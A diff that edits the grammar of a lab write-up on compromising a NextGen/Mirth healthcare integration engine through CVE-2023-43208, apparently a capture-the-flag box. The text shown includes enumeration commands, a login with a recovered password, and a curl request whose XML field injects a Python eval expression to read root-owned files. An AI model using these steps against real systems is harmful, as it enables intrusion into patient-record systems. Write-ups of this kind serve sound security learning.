@@ -1,14 +1,14 @@
 ---
-title: "Hacking NextGen HealtCare getting root to the system"
+title: "Hacking NextGen HealtCare getting root on the system"
 date: 2026-02-21 00:00:00 +0800
 categories: [Bug bounty, hacking]
 tags: [Bug bounty, CTF, Hacking]
 --- 
 
 ## Intro
-In this article we are gonna hack into an Healthcare integration-engine, taking advantage of RemoteC command Execution vulnerability: CVE-2023-43208 and some internal misconfigurations.
+In this articlewe are going to exploit a healthcare integration engine , taking advantage of Remote Command Execution vulnerability: CVE-2023-43208 and some internal misconfigurations.
 
-In real life scenario, it might be one of the worst nightmare for people working in healthcare enviroments, since not only every patient's record could be' removed, but it also fully compromise CIA and the HIPAA standards.
+In a real-life scenario, it might be one of the worst nightmares for people working in healthcare enviroments, since not only every patient's record could be removed, but it would also fully compromise the CIA triad and the HIPAA standards.
 
 ## Information gathering
 
@@ -47,35 +47,35 @@ PORT     STATE  SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-After getting this hash: 62BE2608829EE4917ACB671EF40D5688 which is the MD5 checksum of the icon used in the framework, i tried to compare it to other hashes located in [OWASP Favicon Database](https://owasp.org/www-community/favicons_database) to better understand the framework exact version, however, i got no luck, so i moved on.
+After getting this hash: 62BE2608829EE4917ACB671EF40D5688 which is the MD5 checksum of the icon used in the framework, i tried to compare it to other hashes located in [OWASP Favicon Database](https://owasp.org/www-community/favicons_database) to better understand the framework exact version, however, i had no luck, so i moved on.
 
 #### Services and Technologies:
-22 --> OpenSSH 9.2p1 = Low vulnerabilities
+22 --> OpenSSH 9.2p1
 80 --> HTTP server
 443 --> HTTPS server
 6661 --> IRC?
 
 ### Web service
-Realizing that port 80 and 443 was almost the same service, (also it was no possible to access without the HTTPS protocol) i started enumerating 443.
+Realizing that port 80 and 443 were almost the same service, (also it was not possible to access without the HTTPS protocol) i started enumerating 443.
 
 <img width="636" height="448" alt="image" src="https://github.com/user-attachments/assets/53564e67-106d-4cb0-b07d-b871f10aa5ee" />
 
-Looking for default credentials we found out that admin/admin are the default one, however, since they were not valid, i moved on looking for the version that was used in 2021 (Since i saw thanks to the copyright that date.)
+Looking for default credentials we found out that admin/admin are the default ones, however, since they were not valid, i moved on looking for the version that was used in 2021 (Since i saw thanks to the copyright that date.)
 
 <img width="316" height="50" alt="image" src="https://github.com/user-attachments/assets/e1a0b475-708e-4db0-a0cb-2042c84e849c" />
 
 The version should be: ==3.12.0==
 
-At this point i started enumerating some publicy accessible file by using some busters tools:
+At this point i started enumerating some publicy accessible file by using some directory brute-forcing tools:
 ```
-feroxbuster -u https://10.129.1.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.tx  
-t -X 404 --insecuere
+feroxbuster -u https://10.129.1.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  
+t -X 404 --insecure
 ```
-But nothing spicy was found.
+But no relevant findings were identified.
 
 ## Getting a shell
-I started looking for CVEs and i found out this one: [CVE-2023-43208](https://www.acn.gov.it/portale/w/vulnerabilita-in-prodotti-nextgen-healthcare-al03/231026/csirt-ita-aggiornamento) which impact all the versions prior to 4.4.X.
-Looking in github i found out this PoC that verify if the target server is vulnerable or not: [POC](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT)
+I started looking for CVEs and i found out this one: [CVE-2023-43208](https://www.acn.gov.it/portale/w/vulnerabilita-in-prodotti-nextgen-healthcare-al03/231026/csirt-ita-aggiornamento) which impacts all the versions prior to 4.4.X.
+Looking in github i found out this PoC that verify whether the target server is vulnerable or not: [POC](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT)
 
 Results: 
 ```bash
@@ -137,17 +137,17 @@ show databases;
 <img width="698" height="168" alt="image" src="https://github.com/user-attachments/assets/72ce4c04-a162-4f0a-9ba3-652870b6346a" />
 
 
-I found an hash, the sedric password!
-The only problem was understanding how this hash could have been cracked.
+I found a hash, the sedric’s password hash!
+The only problem was understanding how this hash could be cracked.
 
 Leaving this on the side, i tried using those credentials to access in mirth (both Web and cli )
 ```
 ./mccommand -a 10.129.1.210:6661 -u 'sedric' -p 'MirthPass123!'  
 ```
 
-But nothing seems working
+But nothing seemed to work
 
-After a break, since it's an open source project, i decided to take a look into the password generation code: [Code](https://github.com/nextgenhealthcare/connect/blob/development/core-util%2Fsrc%2Fcom%2Fmirth%2Fcommons%2Fencryption%2FDigester.java)
+After further analysis, since it's an open source project, i decided to take a look into the password generation code: [Code](https://github.com/nextgenhealthcare/connect/blob/development/core-util%2Fsrc%2Fcom%2Fmirth%2Fcommons%2Fencryption%2FDigester.java)
 
 Noticed it was using PBKDF2WithHmacSHA256 by
  ```java
@@ -230,13 +230,13 @@ So i forwarded with SSH this port in my client
 ❯ ssh sedric@10.129.1.210 -L 54321:0.0.0.0:54321 
 ```
 and went to the web page.
-After that i take a long read into the code and noticed a critical vulnerability.
+After that i carefully reviewed the code and noticed a critical vulnerability.
 
 The script is made for adding patients through XML Post requests and saving all in /var/secure-health/patients/<id>.txt
 
-The problem relies on the eval() function, even if the the scripts tries to validate the requests in two way:
+The problem relies on the eval() function, even if the the scripts tries to validate the requests in two ways:
     - If the request doesn't come from 127.0.0.1: Deny
-    - If the request contains specific characters: Deny
+    - If the request contain specific characters: Deny
 It's still vulnerable.
 
 ```python
@@ -251,11 +251,11 @@ curl -X POST http://127.0.0.1:54321/addPatient \
      -H "Content-Type: application/xml" \
      -d "<patient><firstname>{open('/root/'+'root.txt').read()}</firstname><lastname>Rossi</lastname><sender_app>Mirth</sender_app><timestamp>10</timestamp><birth_date>01/01/2000</birth_date><gender>M</gender></patient>"
 ```
-And at this point, i got the root access! :D
+And at this point, i gained root access! :D
 
 
 ## Bonus
-I ended up in a rabbit hole: since the hash seemed to complicated to crack, i supposed it was not the right path and went through a Java Keystore file.
+I ended up in a rabbit hole: since the hash seemed too complicated to crack, i supposed it was not the right path and went through a Java Keystore file.
 
 Since in the same file as before i found:
 ```
@@ -277,7 +277,7 @@ Enter keystore password:   
 Keystore type: JCEKS  
 Keystore provider: SunJCE  
   
-Your keystore contains 2 entries  
+Your keystore contain 2 entries  
   
 Alias name: encryption  
 Creation date: Sep 19, 2025  
@@ -397,7 +397,7 @@ The JCEKS keystore uses a proprietary format. It is recommended to migrate to PK
 t using "keytool -importkeystore -srckeystore keystore.jks/keystore.jks -destkeystore keystore.jks/keystore.jks -deststo  
 retype pkcs12".
 ```
-But i realized it didn't contains any sensitive informations and decided to give another shot the hash, which results in being the right path for taking over and fully compromise the machine!
+But i realized it didn't contain any sensitive information and decided to give another shot the hash, which results in being the right path for taking over and fully compromise the machine!
 
 
 
